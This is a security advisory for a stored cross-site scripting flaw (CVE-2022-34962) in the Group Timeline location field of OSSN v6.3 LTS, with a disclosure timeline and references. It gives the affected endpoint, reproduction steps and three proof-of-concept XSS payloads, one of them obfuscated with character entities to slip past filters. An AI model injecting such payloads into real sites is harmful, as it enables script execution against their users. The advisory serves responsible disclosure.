# OpenTeknik LLC OSSN OPEN SOURCE SOCIAL NETWORK v6.3 LTS

### Vulnerability Explanation:
OpenTeknik LLC OSSN OPEN SOURCE SOCIAL NETWORK v6.3 LTS was discovered to contain a stored cross-site scripting (XSS) vulnerability via the `Group Timeline` module.

### Attack Vectors:
The attacker must post something on the `Group Timeline` and insert the XSS payload at the location input in order to exploit the stored XSS. The XSS payload will be launched immediately after submission.

### Affected: 
- http://ip_address:port/ossn/group/{number} 

- POST /ossn/action/wall/post/g?ossn_ts=1656419377&ossn_token=c0ee6b52f853a5073679f7a82372a0726a6a6e7d5500ec372fef9341f1e45e21

### Payload :
1. `<img/&#09;&#10;&#11; src=~ onerror=prompt('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

2. `<BODY ONLOAD=alert('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

3. `<img src=x onerror=confirm('Grim-The-Ripper-Team-by-SOSECURE-Thailand')>`

### Tested on: 
1. OSSN v6.3 LTS (https://github.com/opensource-socialnetwork/opensource-socialnetwork/releases/tag/6.3)

2. Google Chrome Version 102.0.5005.115 (Official Build) (x86_64)

### Steps to attack:
1. Login with username and password. (If you don't have an account, you can register)
2. Go to a "Groups". (If you don't have any groups, you can click on the "Add Group" button to create one.)
3. Enter data in the data entry form.
4. Click on the location button and enter the XSS payload.
5. The XSS payload will run immediately.

### Discoverer:
:shipit: Grim The Ripper Team by SOSECURE Thailand

### Medium:
- https://grimthereaperteam.medium.com/cve-2022-34962-ossn-6-3-lts-stored-xss-vulnerability-at-group-timeline-6ebe28dd6034

### Disclosure Timeline:
- 2022–06–28: Vulnerability discovered.
- 2022–06–28: Vulnerability reported to the MITRE corporation.
- 2022–07–08: CVE has been reserved.
- 2022–07–08: Public disclosure of the vulnerability.

Reference:
1. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-34962
2. https://www.opensource-socialnetwork.org/
3. https://github.com/opensource-socialnetwork/opensource-socialnetwork/releases/tag/6.3
4. https://www.openteknik.com/contact?channel=ossn
